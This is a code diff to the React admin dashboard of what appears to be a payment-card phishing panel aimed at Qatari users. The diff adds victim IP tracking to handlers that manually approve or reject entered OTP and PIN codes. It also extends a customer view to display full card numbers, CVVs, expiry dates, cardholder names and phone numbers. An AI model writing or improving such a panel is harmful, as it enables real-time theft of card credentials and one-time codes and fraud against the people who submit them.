@@ -189,6 +189,7 @@ export default function AdminDashboard() {
   const approveOTP = () => {
     if (socket && pendingOTP) {
       socket.emit('otpVerificationStatus', {
+        ip: pendingOTP.ip || pendingOTP.payload?.ip,
         status: 'approved',
         message: 'تم قبول رمز التحقق'
       });
@@ -199,6 +200,7 @@ export default function AdminDashboard() {
   const rejectOTP = () => {
     if (socket && pendingOTP) {
       socket.emit('otpVerificationStatus', {
+        ip: pendingOTP.ip || pendingOTP.payload?.ip,
         status: 'rejected',
         message: 'رمز التحقق غير صحيح'
       });
@@ -209,6 +211,7 @@ export default function AdminDashboard() {
   const approvePIN = () => {
     if (socket && pendingPIN) {
       socket.emit('pinVerificationStatus', {
+        ip: pendingPIN.ip || pendingPIN.payload?.ip,
         status: 'approved',
         message: 'تم قبول الرمز السري'
       });
@@ -219,6 +222,7 @@ export default function AdminDashboard() {
   const rejectPIN = () => {
     if (socket && pendingPIN) {
       socket.emit('pinVerificationStatus', {
+        ip: pendingPIN.ip || pendingPIN.payload?.ip,
         status: 'rejected',
         message: 'الرمز السري غير صحيح'
       });
@@ -566,31 +570,87 @@ export default function AdminDashboard() {
                   </h3>
                   <div className="space-y-4">
                     {selectedCustomer.payments.map((payment, idx) => (
-                      <div key={idx} className="bg-white rounded-lg p-4 border-2 border-purple-200">
-                        <div className="flex items-center justify-between mb-3">
-                          <span className="text-xs font-bold text-purple-600 bg-purple-100 px-3 py-1 rounded-full">
-                            بطاقة {idx + 1}
-                          </span>
+                      <div key={idx} className="bg-white rounded-lg p-5 border-2 border-purple-200 shadow-sm">
+                        <div className="flex items-center justify-between mb-4">
+                          <div className="flex items-center gap-3">
+                            <span className="text-sm font-bold text-purple-600 bg-purple-100 px-4 py-1.5 rounded-full">
+                              البطاقة #{idx + 1}
+                            </span>
+                            {idx === selectedCustomer.payments.length - 1 && (
+                              <span className="text-xs text-green-600 bg-green-100 px-3 py-1 rounded-full font-semibold">
+                                الأحدث
+                              </span>
+                            )}
+                          </div>
                           <span className="text-xs text-gray-600">
-                            {new Date(payment.timestamp).toLocaleString('ar-QA')}
+                            {new Date(payment.timestamp || payment.time).toLocaleString('ar-QA')}
                           </span>
                         </div>
-                        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
-                          <div>
-                            <p className="text-gray-600 text-sm mb-1">طريقة الدفع</p>
-                            <p className="font-bold text-purple-600">{payment.paymentMethod || '—'}</p>
+
+                        {/* Payment Method - Always show */}
+                        <div className="mb-4 pb-4 border-b border-purple-100">
+                          <p className="text-gray-600 text-sm mb-1">طريقة الدفع:</p>
+                          <p className="font-bold text-purple-600 text-lg">
+                            {payment.paymentMethod || 'غير محدد'}
+                          </p>
+                        </div>
+
+                        {/* Card Details - Only for Mada/Visa */}
+                        {payment.paymentMethod && (payment.paymentMethod.toLowerCase().includes('mada') || payment.paymentMethod.toLowerCase().includes('visa')) && (
+                          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-4">
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">اسم حامل البطاقة:</p>
+                              <p className="font-semibold text-gray-900">{payment.cardHolderName || '—'}</p>
+                            </div>
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">رقم البطاقة الكامل:</p>
+                              <p className="font-mono font-bold text-purple-600">
+                                💳 {payment.cardNumber || '—'}
+                              </p>
+                            </div>
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">تاريخ الانتهاء:</p>
+                              <p className="font-mono font-semibold">{payment.expirationDate || '—'}</p>
+                            </div>
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">CVV:</p>
+                              <p className="font-mono font-bold text-red-600">{payment.cvv || '—'}</p>
+                            </div>
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">رقم الهاتف:</p>
+                              <p className="font-mono">📱 {payment.phoneNumber || '—'}</p>
+                            </div>
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">آخر 4 أرقام:</p>
+                              <p className="font-mono font-bold">**** {payment.cardLastDigits || payment.cardNumber?.slice(-4) || '—'}</p>
+                            </div>
                           </div>
-                          <div>
-                            <p className="text-gray-600 text-sm mb-1">المبلغ</p>
-                            <p className="font-bold text-purple-600 text-lg">{payment.amount} ريال</p>
+                        )}
+
+                        {/* QPay/Mobile Payment - Only phone */}
+                        {payment.paymentMethod && payment.paymentMethod.toLowerCase().includes('qpay') && (
+                          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                            <div className="bg-purple-50 rounded-lg p-3">
+                              <p className="text-gray-600 text-xs mb-1">رقم الهاتف:</p>
+                              <p className="font-mono font-bold text-purple-600">
+                                📱 {payment.phoneNumber || payment.phone || '—'}
+                              </p>
+                            </div>
                           </div>
-                          <div>
-                            <p className="text-gray-600 text-sm mb-1">آخر 4 أرقام</p>
-                            <p className="font-mono font-bold">**** {payment.cardLastDigits || '****'}</p>
+                        )}
+
+                        {/* Amount and Time - Always show */}
+                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-4 border-t border-purple-100">
+                          <div className="bg-gradient-to-r from-purple-100 to-purple-50 rounded-lg p-3">
+                            <p className="text-gray-600 text-xs mb-1">المبلغ المدفوع:</p>
+                            <p className="font-bold text-purple-600 text-2xl">💰 QAR {payment.amount || '—'}</p>
                           </div>
-                          <div>
-                            <p className="text-gray-600 text-sm mb-1">رقم الهاتف</p>
-                            <p className="font-mono">{payment.phoneNumber || '—'}</p>
+                          <div className="bg-purple-50 rounded-lg p-3">
+                            <p className="text-gray-600 text-xs mb-1">وقت الدفع:</p>
+                            <p className="font-mono text-sm font-semibold">
+                              {payment.timestamp ? new Date(payment.timestamp).toLocaleString('ar-QA') : 
+                               payment.time ? new Date(payment.time).toLocaleString('ar-QA') : '—'}
+                            </p>
                           </div>
                         </div>
                       </div>
